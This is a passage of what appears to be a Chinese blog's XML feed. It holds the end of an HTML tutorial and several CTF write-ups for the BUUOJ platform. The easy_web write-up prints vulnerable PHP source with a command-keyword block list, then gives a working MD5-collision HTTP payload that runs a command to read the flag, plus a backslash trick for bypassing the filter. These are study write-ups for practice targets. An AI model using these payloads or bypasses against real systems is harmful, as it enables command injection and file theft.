class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>沿这条路走到头<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>右转<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>直行穿过第一个十字路口<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>在第三个十字路口处左转<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>继续走 300 米，学校就在你的右手边<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><ol>  <li>沿这条路走到头</li>  <li>右转</li>  <li>直行穿过第一个十字路口</li>  <li>在第三个十字路口处左转</li>  <li>继续走 300 米，学校就在你的右手边</li></ol><p>aaa</p><h3 id="HTML表格table"><a href="#HTML表格table" class="headerlink" title="HTML表格table"></a>HTML表格table</h3><p>示例:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="comment">&lt;!--这是表格的标签--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="comment">&lt;!--表头--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="comment">&lt;!--table row--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>语文<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="comment">&lt;!--table head--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>数学<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>外语<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="comment">&lt;!--table body--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="comment">&lt;!--同样是table row--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!--table data--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span>  </span><br></pre></td></tr></table></figure><table>    <head>        <tr>            <th>语文</th>            <th>数学</th>            <th>外语</th>        </tr>    </head>    <body>        <tr>            <td>100</td>            <td>100</td>            <td>100</td>        </tr>    </body> </table><h3 id="HTML表单form"><a href="#HTML表单form" class="headerlink" title="HTML表单form"></a>HTML表单form</h3><p>示例:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">&quot;form.js&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your username&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter your password&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><form action = "form.js" method="post">        <div>            <label>username</label>            <input type="text" name="username" placeholder="Enter your username">        </div>        <div>            <label>password</label>            <input type="password" name="password" placeholder="Enter your password">        </div>        <input type="submit" name="submit" value="submit">    </form><h3 id="强调与加粗"><a href="#强调与加粗" class="headerlink" title="&lt;em&gt;&lt;/em&gt;强调与&lt;strong&gt;&lt;/strong&gt;加粗"></a><code>&lt;em&gt;&lt;/em&gt;</code>强调与<code>&lt;strong&gt;&lt;/strong&gt;</code>加粗</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">  这杯液体<span class="tag">&lt;<span class="name">strong</span>&gt;</span>毒性很大<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>——如果饮用了它，你<span class="tag">&lt;<span class="name">strong</span></span></span><br><span class="line"><span class="tag">    &gt;</span>可能<span class="tag">&lt;<span class="name">em</span>&gt;</span>会死<span class="tag">&lt;/<span class="name">em</span>&gt;</span>&lt;/strong</span><br><span class="line">  &gt;。</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><p>  这杯液体<strong>毒性很大</strong>——如果饮用了它，你<strong    >可能<em>会死</em></strong  >。</p><h3 id="在html中嵌入多媒体"><a href="#在html中嵌入多媒体" class="headerlink" title="在html中嵌入多媒体"></a>在html中嵌入多媒体</h3><h4 id="图片"><a href="#图片" class="headerlink" title="图片:"></a>图片:</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;example.jpg&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://example.com/example.jpg&quot;</span> /&gt;</span></span><br><span class="line">可选图片描述或尺寸:</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">&quot;example.jpg&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">alt</span>=<span class="string">&quot;this is a picture!&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">with</span>=<span class="string">&quot;123&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">height</span>=<span class="string">&quot;456&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h4 id="音频与视频"><a href="#音频与视频" class="headerlink" title="音频与视频:"></a>音频与视频:</h4><p>直接嵌入一段视频</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;example.webm&quot;</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">你的浏览器不支持 HTML5 视频。可点击<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;rabbit320.mp4&quot;</span>&gt;</span>此链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span>观看</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><p>根据用户所能支持的格式播放对应的视频</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;example.mp4&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;example.webm&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    你的浏览器不支持 HTML5 视频。可点击<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;example.mp4&quot;</span>&gt;</span>此链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span>观看</span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注:</p><ol><li><code>&lt;p&gt;</code>标签中的内容只有在视频无法显示时才会出现</li><li>controls 使得用户可以操控视频 例如拖动进度条等</li></ol><p>对于音频,只需要把<code>&lt;video&gt;&lt;/video&gt;</code>标签改为<code>&lt;audio&gt;&lt;/audio&gt;</code>并嵌入音频路径即可</p><h3 id="块级元素与内联元素"><a href="#块级元素与内联元素" class="headerlink" title="块级元素&lt;div&gt;与内联元素&lt;span&gt;"></a>块级元素<code>&lt;div&gt;</code>与内联元素<code>&lt;span&gt;</code></h3><p>简单理解块级与内联:</p><p>块级元素会独占一行   如: <code>&lt;h1&gt;, &lt;p&gt;, &lt;ul&gt;, &lt;table&gt;</code></p><p>内联元素不会独占一行 如: <code> &lt;b&gt;, &lt;td&gt;, &lt;a&gt;, &lt;img&gt;</code></p><p><code>&lt;div&gt;与&lt;span&gt;</code>并没有实际意义,而是与css一同使用时为整体或部分文本设置样式与属性</p><h2 id="HTML脚本"><a href="#HTML脚本" class="headerlink" title="HTML脚本"></a>HTML脚本</h2><p>内联嵌入<code>javascript</code>客户端脚本:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;Hello World!&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span>抱歉，你的浏览器不支持 JavaScript!<span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过src引入:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;example.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 语言基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯 2019 高明的黑客</title>
      <link href="/2024/01/19/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"/>
      <url>/2024/01/19/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p>按照提示下载了备份文件,里面存了一大堆php木马</p><p>但是仔细观察发现大部分都要么不能运行,要么没什么实际功能</p><p>看了wp,发现此题是考验python脚本编写能力,即检索出能够利用的php文件</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯 2019 easy_web</title>
      <link href="/2024/01/14/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/"/>
      <url>/2024/01/14/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/</url>
      
        <content type="html"><![CDATA[<h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure><p>这个位置很容易想到任意文件读取,不过文件名应该经过了某种编码或加密</p><p>经过尝试,<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code>两次base64一次字符串转16进制得到<code>555.png</code></p><p>构造payload读取<code>index.php</code>源码</p><p>payload:</p><p>&#x2F;index.php?img&#x3D;TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd&#x3D;</p><p>将得到的回包中的base64码解码得到:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>主要考察md5强碰撞</p><p><a href="https://blog.51cto.com/u_14601424/6258344">浅谈md5弱类型比较和强碰撞</a></p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?cmd=sort%20/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>e731dded-fc69-4975-9a54-828c91d5138d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>307</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://e731dded-fc69-4975-9a54-828c91d5138d.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://e731dded-fc69-4975-9a54-828c91d5138d.node5.buuoj.cn:81/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=l\s</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">a<span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%00</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1U</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span>&amp;b<span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%02</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1</span><span class="variable">%D5</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span></span></span><br></pre></td></tr></table></figure><p>得到flag:</p><p>sort &#x2F;flag<br>flag{aeaa3aba-1fc0-49bf-83bb-bb67d58acb5a}</p><p>这里没有过滤sort,当然,也可以使用<code>\</code>来绕过对命令的过滤,如<code>ca\t /flag</code></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php md5强碰撞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 2020 朱雀组 phpweb</title>
      <link href="/2024/01/14/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/"/>
      <url>/2024/01/14/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>aaaa</p><p>进去之后有一个date()的报错,然后不断刷新</p><p>容易发现这个date函数是由传入的func的值确认的</p><p>但是将func改为其他函数如system等则会回显Hacker</p><p>尝试读取源码</p><p>post传参: func&#x3D;highlight_file&amp;p&#x3D;index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;phpweb&lt;/title&gt;</span><br><span class="line">    &lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background: <span class="title function_ invoke__">url</span>(<span class="string">&quot;bg.jpg&quot;</span>) no-repeat;</span><br><span class="line">            background-size: <span class="number">100</span>%;</span><br><span class="line">        &#125;</span><br><span class="line">        p &#123;</span><br><span class="line">            color: white;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script language=javascript&gt;</span><br><span class="line">    <span class="title function_ invoke__">setTimeout</span>(<span class="string">&quot;document.form1.submit()&quot;</span>,<span class="number">5000</span>)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span 